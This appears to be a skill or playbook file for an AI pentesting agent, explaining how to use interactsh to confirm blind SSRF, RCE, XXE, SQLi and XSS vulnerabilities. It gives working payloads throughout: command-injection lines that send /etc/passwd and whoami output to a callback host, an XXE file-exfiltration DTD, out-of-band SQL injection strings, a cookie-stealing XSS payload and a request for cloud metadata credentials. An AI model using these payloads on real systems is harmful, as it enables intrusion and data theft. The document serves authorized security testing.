---
name: interactsh
description: interactsh-client OOB interaction testing for blind SSRF, blind RCE, blind XXE, blind SQLi, DNS rebinding, and any vulnerability where the only proof is a callback to a controlled server
---

# interactsh Playbook

Official docs:
- https://github.com/projectdiscovery/interactsh
- https://docs.projectdiscovery.io/opensource/interactsh/usage

interactsh provides a public OOB (out-of-band) interaction server for confirming blind vulnerabilities. The server records DNS, HTTP, and SMTP callbacks. When a target server makes a request to your interactsh domain (because you triggered an SSRF/RCE/XXE payload), you see the interaction in your client. This is the safest way to confirm blind bugs without writing custom listener infrastructure.

## Why interactsh over Burp Collaborator

- **Free, no license** — `oast.pro` public server is the default
- **Multi-protocol** — DNS, HTTP, HTTPS, SMTP, SMTPS, LDAP, SMB, FTP, etc.
- **CLI + library** — integrates with `notify` webhooks, JSON output for scripts
- **Filtering + correlation** — match interactions to specific payloads
- **No rate limits** (per their docs) — suitable for high-volume scans
- **Built-in payload generation** — `interactsh-client` produces unique subdomains per payload

## Quick Start

**Single-shot mode (run for N seconds, dump results):**
```
interactsh-client -v -o interactions.json -d /tmp/interactsh-session
# (waits for interactions — Ctrl-C to stop)
```

**Persistent mode (long-running listener, webhook on new interaction):**
```
interactsh-client -v -persist -n 30 -webhook-url http://localhost:9000/hook
# -persist keeps running, -n 30 polls every 30s
```

**Generate a payload you embed in a test:**
```
interactsh-client -v -o /tmp/oast.json &
sleep 3
PAYLOAD=$(cat /tmp/oast.json | jq -r '.correlation_id')
echo "Use this in your payload: $PAYLOAD.oast.pro"
```

**Just get a fresh domain (one-liner):**
```
interactsh-client -payload-only
# Outputs: abcdef1234567890.oast.pro
```

## High-Signal Flags

**Input/output**
- `-payload-only` — just print a new unique domain, don't start a listener
- `-v` — verbose logging
- `-o <file>` — output JSON of all interactions
- `-d <dir>` — session directory (for resume / persistence)
- `-persist` — keep running after first interaction
- `-n <seconds>` — poll interval (default 30s)
- `-timeout <seconds>` — exit after N seconds of no interaction

**Payload filters**
- `-filter <regex>` — only show interactions matching this regex
- `-payload <domain>` — listen for interactions on a specific custom domain
- `-no-data-mining` — disable auto-generated payloads (e.g., for SSRF in URL path)

**Notifications**
- `-webhook-url <url>` — POST to URL on each interaction
- `-webhook-method <POST|GET>` — HTTP method for webhook
- `-slack-webhook-url <url>` — Slack notifications
- `-discord-webhook-url <url>` — Discord notifications
- `-telegram-webhook-url <url>` — Telegram notifications
- `-pushover-webhook-url <url>` — Pushover notifications
- `-operator-url <url>` — Operator (ProjectDiscovery) cloud integration

**Server / source**
- `-server <host>` — custom interactsh server (default: `oast.pro`)
- `-source-ip <ip>` — bind to specific local IP
- `-auth <token>` — server auth token (if required by private server)

**Evasion / fragmentation**
- `-poll-interval <seconds>` — alias for `-n`
- `-correlation-id <id>` — explicit correlation ID (rare)

## Use Cases

### Blind SSRF Confirmation

The classic case: an app accepts a URL parameter and fetches it server-side, but doesn't return the response body. How do you confirm the SSRF?

**1. Generate an interactsh domain:**
```
PAYLOAD=$(interactsh-client -payload-only)
echo "$PAYLOAD"
# → 7d4c2f8a9e1b3c4d.oast.pro
```

**2. Embed it in your SSRF test:**
```
curl -X POST https://target.com/api/fetch \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://$PAYLOAD/test-ssrf\"}"
```

**3. Watch for interaction in your interactsh client:**
```
interactsh-client -v -o /tmp/oast.json
# Will print:
# [7d4c2f8a9e1b3c4d.oast.pro] Received HTTP interaction from 1.2.3.4 at 2025-06-11 ...
# GET /test-ssrf HTTP/1.1
# Host: 7d4c2f8a9e1b3c4d.oast.pro
# ...
```

The DNS resolution + HTTP callback confirms the server made a request to your domain. SSRF confirmed.

### Blind RCE Confirmation (Deserialization, SSTI, RCE Chains)

For any RCE that doesn't return output but you can chain command execution:

**1. Generate domain:**
```
PAYLOAD=$(interactsh-client -payload-only)
```

**2. Embed in RCE payload (varies by language):**

Java (Runtime.exec / ProcessBuilder):
```
# Reverse shell won't be visible — use curl to a domain instead
java -jar ysoserial-all.jar CommonsCollections6 "curl http://$PAYLOAD/rce-$(whoami)"
```

Python (pickle / eval / SSTI):
```
# pickle
pickle.dumps(Exploit())  # uses os.system('curl http://.../$(whoami)')

# Jinja2 SSTI
{{ ''.__class__.__mro__[1].__subclasses__()[X]('curl http://$PAYLOAD/',shell=True) }}
```

PHP (unserialize / `system()`):
```
unserialize($_GET['x']);  // chain to: system("curl http://$PAYLOAD/?data=$(cat /etc/passwd | base64)")
```

Node.js (child_process):
```
require('child_process').exec('curl http://$PAYLOAD/?data=$(id)')
```

**3. Watch for the interaction** — proves the command ran, even if you can't see the output.

For exfiltration (read a file via the interaction):
```
curl http://$PAYLOAD/$(cat /etc/passwd | base64 | tr -d '\n' | head -c 500)
```
The interactsh client will show the file contents in the HTTP request path.

### Blind XXE Confirmation

XXE that doesn't reflect data in the response is still detectable via OOB:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://$PAYLOAD/xxe-direct">
  %xxe;
]>
<root>test</root>
```

Or via parameter entity + external DTD (for OOB file exfil):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe-oob.dtd">
  %dtd;
]>
<root>&send;</root>
```
Where `xxe-oob.dtd`:
```xml
<!ENTITY % wrap "<!ENTITY send 'http://$PAYLOAD/?data=%file;'>">
%wrap;
```

The interactsh client will see the HTTP request to your DTD first, then the data-exfiltration request to your domain with `/etc/hostname` in the path.

### Blind SQLi (Out-of-Band)

Some SQLi sinks are entirely blind — no time-based signal, no error output, no boolean differential. Use OOB techniques:

**MySQL LOAD_FILE + UNC path** (Windows):
```sql
' UNION SELECT LOAD_FILE('\\\\$PAYLOAD\\share\\file') --
```

**MSSQL OPENROWSET** (DNS exfil):
```sql
'; EXEC master..xp_dirtree '\\\\$PAYLOAD\\share' --
```

**Oracle UTL_HTTP** (outbound HTTP):
```sql
' UNION SELECT UTL_HTTP.REQUEST('http://$PAYLOAD/oracle-sqli') FROM dual --
```

**PostgreSQL COPY** (if superuser) or `dblink`:
```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://$PAYLOAD/pg-sqli' --
```

### Blind XSS (DNS prefetch / OOB exfil)

For stored XSS where you want to exfiltrate the victim's cookie or page content:

```html
<img src="http://$PAYLOAD/x?cookie=" + encodeURIComponent(document.cookie)>
```
Or:
```html
<script>
fetch('/api/account').then(r => r.json()).then(d =>
  fetch('http://$PAYLOAD/exfil?data=' + btoa(JSON.stringify(d)))
);
</script>
```

For headless browser validation in the sandbox:
```bash
agent-browser open "https://target.com/vulnerable-page-with-xss"
agent-browser wait 10000
agent-browser close
```

### SSRF → Cloud Metadata

```bash
# Test 1: Confirm SSRF exists
curl -X POST https://target.com/api/fetch \
  -d "url=http://$PAYLOAD/ssrf-test"

# Test 2: Attempt cloud metadata access (only if SSRF confirmed)
curl -X POST https://target.com/api/fetch \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### DNS Rebinding Setup

For attacks where you need the same domain to first resolve to your IP (callback), then to target's IP (SSRF target):

```bash
# Use interactsh to verify DNS resolution
# Then use a dedicated rebinding tool (e.g., rebinder, singularity)
```

interactsh is for confirmation only — for the actual rebinding attack, you need a custom DNS server.

## Webhook Integration

Set up a webhook to pipe interactions into your scan pipeline:

```bash
# 1. Start a simple webhook receiver
cat > webhook.py << 'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        data = json.loads(body)
        # data has keys: Protocol, FullId, QType, Raw, etc.
        print(f"[!] Interaction: {data['Protocol']} {data.get('Raw', '')[:200]}")
        self.send_response(200); self.end_headers()

HTTPServer(('localhost', 9000), H).serve_forever()
EOF
python3 webhook.py &

# 2. Start interactsh with webhook
interactsh-client -v -persist -webhook-url http://localhost:9000
```

## Common Patterns

**Wait + read interactions from JSON:**
```bash
# Start listener in background
interactsh-client -o /tmp/oast.json -timeout 60 &
LISTENER_PID=$!

# Generate payload
PAYLOAD=$(interactsh-client -payload-only)

# Trigger all your blind tests with this payload
echo "Testing SSRF at: http://$PAYLOAD"

# Wait for the listener to record interactions
wait $LISTENER_PID

# Parse results
jq '.[] | {protocol, raw, timestamp}' /tmp/oast.json
```

**Multi-payload for parallel tests (e.g., 10 endpoints at once):**
```bash
# Generate 10 unique payloads
for i in {1..10}; do
  interactsh-client -payload-only > /tmp/payload-$i.txt
done

# Inject each into a different test endpoint
for i in {1..10}; do
  P=$(cat /tmp/payload-$i.txt)
  curl -X POST https://target.com/api/test-$i -d "url=http://$P/test-$i" &
done

# Listen and correlate
interactsh-client -o /tmp/oast.json -timeout 30
# Filter to specific test: jq '.[] | select(.Raw | contains("/test-3"))' /tmp/oast.json
```

**Filter for specific protocol in listener:**
```bash
interactsh-client -v -filter "DNS" -o /tmp/dns.json
# Only logs DNS interactions
```

## Critical Correctness Rules

- **Use unique payloads per test** — don't reuse one payload across multiple tests; you can't tell which endpoint triggered
- **Watch DNS as primary signal** — even if HTTP is blocked, DNS resolution often goes through (corporate DNS allows, HTTP firewall blocks)
- **Use HTTPS only for HTTP** — sometimes the server will fetch `http://` but not `https://` (no TLS), or vice versa
- **Allow 30-60s polling time** — DNS propagation + server-side processing has latency
- **Don't rely on body content in HTTP request** — the request line (path, query) is enough to prove the call
- **Always run `interactsh-client -payload-only` fresh** — old payloads may be cached and not trigger a new resolution
- **Use `-n 5` or lower for fast tests** — default 30s polling is slow for CI

## Failure Recovery

**No interaction recorded despite RCE working:**
- Target may be in an isolated network with no outbound DNS / HTTP
- Use a different protocol: try SMB, FTP, or LDAP
- Use TCP listener (`nc -lnvp 4444`) and have RCE dial out to a specific IP:port
- Try DNS over HTTPS (DoH) — some firewalls miss encrypted DNS

**Payload refused by target app (URL validation):**
- Use a subdomain of a domain you control instead of `oast.pro`
- Try without TLS (`http://` not `https://`)
- Try URL-encoded variant
- IP-literal: `http://<your-public-ip>:80/` instead of domain

**interactsh client disconnects:**
- Re-run with `-d <same_dir>` to resume
- Some sessions expire after 1 hour; start fresh

**Server returns "no interactions" but you expected one:**
- Run with `-v` to see all polling attempts
- Confirm the server resolved the DNS (check `nslookup $PAYLOAD.oast.pro`)
- Use the public client (not local) for verification: `dig $PAYLOAD.oast.pro`

## Tool Composition

interactsh works alongside:

- **ffuf** — for SSRF parameter discovery with OOB confirmation
- **sqlmap** with `--oob --dns-domain=<your-domain>` — OOB SQLi
- **Burp Collaborator** — same purpose, more enterprise, more expensive
- **Proxy tools** — capture and replay with mutated payloads
- **nuclei** — many templates embed interactsh payloads
- **Goby / vulmap** — Chinese pentest tools with built-in OOB

## When interactsh Isn't Enough

- **Local network only** (no outbound internet) — use a local listener (`nc`, `socat`)
- **Strict egress firewall** — TCP listener on a public IP/port, configure interactsh to use raw TCP
- **Encrypted exfiltration** — interactsh records plaintext; for HTTPS-MITM you'd need a cert-pinned listener

If uncertain, query `web_search` with:
`"interactsh" OR "oast" OR "oob" "<vuln-class>" 2025`
